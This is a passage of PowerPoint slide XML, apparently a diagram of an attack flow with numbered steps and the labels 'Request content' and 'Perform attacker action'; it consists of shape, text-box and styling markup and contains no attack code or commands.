              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="0365C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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="object 28"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="1260000">
            <a:off x="4483754" y="3740157"/>
            <a:ext cx="358588" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPts val="2405"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2471" spc="-4" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1333FF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>3</a:t>
            </a:r>
            <a:endParaRPr sz="2471">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="165910" name="object 29"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8110258" y="5427850"/>
            <a:ext cx="334776" cy="320768"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId7"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="165911" name="object 30"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8135471" y="5436254"/>
            <a:ext cx="282949" cy="267540"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId8"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="165912" name="object 31"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8135471" y="5436254"/>
            <a:ext cx="284350" cy="267540"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 0 w 415290"/>
              <a:gd name="T1" fmla="*/ 0 h 379729"/>
              <a:gd name="T2" fmla="*/ 944 w 415290"/>
              <a:gd name="T3" fmla="*/ 0 h 379729"/>
              <a:gd name="T4" fmla="*/ 944 w 415290"/>
              <a:gd name="T5" fmla="*/ 1713 h 379729"/>
              <a:gd name="T6" fmla="*/ 0 w 415290"/>
              <a:gd name="T7" fmla="*/ 1713 h 379729"/>
              <a:gd name="T8" fmla="*/ 0 w 415290"/>
              <a:gd name="T9" fmla="*/ 0 h 3797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15290" h="379729">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="415086" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="415086" y="379399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="379399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="FF2A06">
              <a:alpha val="50195"/>
            </a:srgbClr>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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="object 21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="1200000">
            <a:off x="4989420" y="3863264"/>
            <a:ext cx="2512919" cy="243656"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPts val="1877"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2030" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Request</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2030" spc="-56" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="3000" spc="21" baseline="-1915" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>content</a:t>
            </a:r>
            <a:endParaRPr sz="3000" baseline="-1915" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="165914" name="object 22"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4616824" y="3227294"/>
            <a:ext cx="322169" cy="331975"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 989 w 471170"/>
              <a:gd name="T1" fmla="*/ 622 h 471170"/>
              <a:gd name="T2" fmla="*/ 1023 w 471170"/>
              <a:gd name="T3" fmla="*/ 826 h 471170"/>
              <a:gd name="T4" fmla="*/ 1035 w 471170"/>
              <a:gd name="T5" fmla="*/ 1033 h 471170"/>
              <a:gd name="T6" fmla="*/ 1028 w 471170"/>
              <a:gd name="T7" fmla="*/ 1239 h 471170"/>
              <a:gd name="T8" fmla="*/ 1003 w 471170"/>
              <a:gd name="T9" fmla="*/ 1435 h 471170"/>
              <a:gd name="T10" fmla="*/ 959 w 471170"/>
              <a:gd name="T11" fmla="*/ 1619 h 471170"/>
              <a:gd name="T12" fmla="*/ 899 w 471170"/>
              <a:gd name="T13" fmla="*/ 1783 h 471170"/>
              <a:gd name="T14" fmla="*/ 823 w 471170"/>
              <a:gd name="T15" fmla="*/ 1922 h 471170"/>
              <a:gd name="T16" fmla="*/ 733 w 471170"/>
              <a:gd name="T17" fmla="*/ 2031 h 471170"/>
              <a:gd name="T18" fmla="*/ 634 w 471170"/>
              <a:gd name="T19" fmla="*/ 2100 h 471170"/>
              <a:gd name="T20" fmla="*/ 532 w 471170"/>
              <a:gd name="T21" fmla="*/ 2126 h 471170"/>
              <a:gd name="T22" fmla="*/ 433 w 471170"/>
              <a:gd name="T23" fmla="*/ 2112 h 471170"/>
              <a:gd name="T24" fmla="*/ 337 w 471170"/>
              <a:gd name="T25" fmla="*/ 2059 h 471170"/>
              <a:gd name="T26" fmla="*/ 246 w 471170"/>
              <a:gd name="T27" fmla="*/ 1970 h 471170"/>
              <a:gd name="T28" fmla="*/ 167 w 471170"/>
              <a:gd name="T29" fmla="*/ 1846 h 471170"/>
              <a:gd name="T30" fmla="*/ 100 w 471170"/>
              <a:gd name="T31" fmla="*/ 1690 h 471170"/>
              <a:gd name="T32" fmla="*/ 46 w 471170"/>
              <a:gd name="T33" fmla="*/ 1505 h 471170"/>
              <a:gd name="T34" fmla="*/ 13 w 471170"/>
              <a:gd name="T35" fmla="*/ 1300 h 471170"/>
              <a:gd name="T36" fmla="*/ 0 w 471170"/>
              <a:gd name="T37" fmla="*/ 1093 h 471170"/>
              <a:gd name="T38" fmla="*/ 7 w 471170"/>
              <a:gd name="T39" fmla="*/ 888 h 471170"/>
              <a:gd name="T40" fmla="*/ 33 w 471170"/>
              <a:gd name="T41" fmla="*/ 692 h 471170"/>
              <a:gd name="T42" fmla="*/ 76 w 471170"/>
              <a:gd name="T43" fmla="*/ 508 h 471170"/>
              <a:gd name="T44" fmla="*/ 136 w 471170"/>
              <a:gd name="T45" fmla="*/ 343 h 471170"/>
              <a:gd name="T46" fmla="*/ 212 w 471170"/>
              <a:gd name="T47" fmla="*/ 204 h 471170"/>
              <a:gd name="T48" fmla="*/ 303 w 471170"/>
              <a:gd name="T49" fmla="*/ 96 h 471170"/>
              <a:gd name="T50" fmla="*/ 402 w 471170"/>
              <a:gd name="T51" fmla="*/ 27 h 471170"/>
              <a:gd name="T52" fmla="*/ 503 w 471170"/>
              <a:gd name="T53" fmla="*/ 0 h 471170"/>
              <a:gd name="T54" fmla="*/ 603 w 471170"/>
              <a:gd name="T55" fmla="*/ 14 h 471170"/>
              <a:gd name="T56" fmla="*/ 699 w 471170"/>
              <a:gd name="T57" fmla="*/ 67 h 471170"/>
              <a:gd name="T58" fmla="*/ 788 w 471170"/>
              <a:gd name="T59" fmla="*/ 157 h 471170"/>
              <a:gd name="T60" fmla="*/ 869 w 471170"/>
              <a:gd name="T61" fmla="*/ 279 h 471170"/>
              <a:gd name="T62" fmla="*/ 935 w 471170"/>
              <a:gd name="T63" fmla="*/ 436 h 471170"/>
              <a:gd name="T64" fmla="*/ 989 w 471170"/>
              <a:gd name="T65" fmla="*/ 622 h 47117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71170" h="471170">
                <a:moveTo>
                  <a:pt x="449552" y="137685"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="464888" y="182834"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="470745" y="228730"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="467591" y="274118"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="455895" y="317745"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="436126" y="358355"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="408751" y="394696"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="374239" y="425513"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="333059" y="449552"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="287910" y="464888"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="242014" y="470745"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="196626" y="467591"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="152999" y="455895"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="112389" y="436126"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="76048" y="408751"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="45231" y="374239"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="21192" y="333059"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5856" y="287910"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="242014"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3153" y="196626"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14849" y="152999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="34619" y="112389"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="61993" y="76048"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="96505" y="45231"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="137685" y="21193"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="182834" y="5856"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="228730" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="274118" y="3153"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="317745" y="14849"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="358355" y="34619"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="394696" y="61993"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="425513" y="96505"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="449552" y="137685"/>
                </a:lnTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="25399">
            <a:solidFill>
              <a:srgbClr val="0365C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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="object 23"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="1200000">
            <a:off x="4685460" y="3290521"/>
            <a:ext cx="358588" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPts val="2409"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2471" spc="-4" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1333FF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
            <a:endParaRPr sz="2471" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="35" name="Straight Arrow Connector 34"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4088747" y="3281924"/>
            <a:ext cx="3332349" cy="1368518"/>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37" name="Straight Arrow Connector 36"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1" flipV="1">
            <a:off x="4155982" y="3908051"/>
            <a:ext cx="3311338" cy="1368519"/>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pic>
        <p:nvPicPr>
          <p:cNvPr id="165918" name="Picture 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830761" y="4370295"/>
            <a:ext cx="1927412" cy="178033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6" name="object 37"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="1260000">
            <a:off x="4703669" y="5082447"/>
            <a:ext cx="2213162" cy="179536"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="1359"/>
              </a:lnSpc>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2471" spc="-19" baseline="3584" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C82506"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Perform </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2471" spc="6" baseline="1792" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C82506"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>attacker</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2471" spc="-59" baseline="1792" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C82506"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1765" spc="9" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C82506"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>action</a:t>
            </a:r>
            <a:endParaRPr sz="1765" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="165920" name="object 39"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="1260000">
            <a:off x="4492159" y="4666212"/>
            <a:ext cx="322169" cy="205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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
